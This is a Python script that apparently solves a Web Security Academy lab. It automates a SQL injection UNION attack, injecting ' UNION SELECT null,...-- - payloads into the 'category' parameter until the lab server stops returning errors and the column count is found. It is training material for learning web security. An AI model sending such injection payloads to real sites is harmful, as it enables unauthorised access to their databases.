#########################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 16/9/2023
#
# Lab: SQL injection UNION attack, determining the number of columns returned
#      by the query
#
# Steps: 1. Inject payload into 'category' query parameter to determine
#           the number of columns
#        2. Add one additional null column at a time
#        3. Repeat this process, increasing the number of columns until you
#           receive a valid response
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########
# change this to your lab URL
url = "https://0ac90018045e57a7845755d0006d000e.web-security-academy.net"

print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")

for i in range(1, 10):
    try:
        # number of nulls
        nulls = "null, " * i
        # payload to determine the number of columns
        payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
        print(Fore.WHITE + f"[*] Trying payload: {payload}")
        # fetch the page with the injected payload
        injection = requests.get(
            f"{url}/filter?category={payload}")
        # extract the error text
        internal_error_text = re.findall("<h4>Internal Server Error</h4>",
                                    injection.text)
        # if the response is successful with no error text
        if len(internal_error_text) == 0:
            print(Fore.WHITE + "[#] Number of columns: " + Fore.GREEN + str(i))
            print(
                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
            break
        else:
            continue
    except:
        print(Fore.RED +
              "[!] Failed to inject the payload to determine the number of columns through exception")
